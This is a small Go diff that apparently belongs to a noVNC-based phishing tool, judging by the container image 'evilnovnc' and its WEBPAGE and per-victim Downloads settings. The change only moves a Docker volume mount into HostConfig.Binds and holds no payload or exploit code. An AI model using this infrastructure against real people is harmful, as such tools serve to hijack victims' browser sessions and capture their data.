@@ -106,10 +106,7 @@ func check_num_docker() int{
 func run_docker(uuid string, resolution string, folder string, webpage string) int{
     imageName := "evilnovnc"
     envvar := []string{"FOLDER="+uuid+"","RESOLUTION="+resolution+"x24","WEBPAGE="+webpage+""}
-    volumes:= map[string]struct{}{
-        folder+"/Downloads/"+uuid+":/home/user/Downloads": struct{}{},
-    }
-
+    volumes := []string{folder+"/Downloads/"+uuid+"/:/home/user/Downloads"}
     ctx := context.Background()
     cli, err := client.NewClientWithOpts(client.FromEnv, client.WithAPIVersionNegotiation())
     
@@ -128,8 +125,9 @@ func run_docker(uuid string, resolution string, folder string, webpage string) i
     resp, err := cli.ContainerCreate(ctx, &container.Config{
 		Image: imageName,
         Env: envvar,
-        Volumes: volumes,
-	}, nil, networkConfig, nil, uuid)
+	}, &container.HostConfig{
+        Binds: volumes,
+    }, networkConfig, nil, uuid)
     
     if err != nil {
 		return 1
